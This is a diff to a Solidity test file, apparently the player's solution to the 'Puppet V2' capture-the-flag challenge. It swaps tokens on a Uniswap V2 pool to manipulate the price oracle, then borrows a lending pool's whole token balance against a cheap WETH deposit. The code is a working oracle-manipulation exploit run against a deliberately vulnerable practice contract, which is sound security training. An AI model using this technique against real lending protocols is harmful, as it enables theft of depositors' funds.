@@ -98,7 +98,52 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        console.log("### test_puppetV2 START ###");
+
+        address token0 = uniswapV2Exchange.token0();
+        address token1 = uniswapV2Exchange.token1();
+        (uint112 amount0, uint112 amount1,) = uniswapV2Exchange.getReserves();
+        uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("weth address :", address(weth));
+        console.log("token address:", address(token));
+        console.log(token0, "token0 amount:", amount0);
+        console.log(token1, "token1 amount:", amount1);
+        console.log("pool balance token :", token.balanceOf(address(lendingPool)));
+        console.log("deposit weth amount:", amount);
+        console.log("player balance     :", player.balance);
+        console.log("player balance weth:", weth.balanceOf(player));
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_WETH_RESERVE - (0.9 ether), path, player,  block.timestamp + 1000);
+
+        console.log("");
+        console.log("#2 Swap token to ETH");
+        console.log("player balance     :", player.balance);
+
+        console.log("");
+        console.log("#3 Borrow token from pool");
+        // Calculate how much WETH the user must deposit
+        amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: amount}();
+        console.log("deposit weth amount:", amount);
+        console.log("player balance weth:", weth.balanceOf(player));
+
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log("");
+        console.log("#4 After attack");
+        console.log("pool balance token :", token.balanceOf(address(lendingPool)));
+
+        console.log("");
+        console.log("### test_puppetV2 END ###");
     }
 
     /**
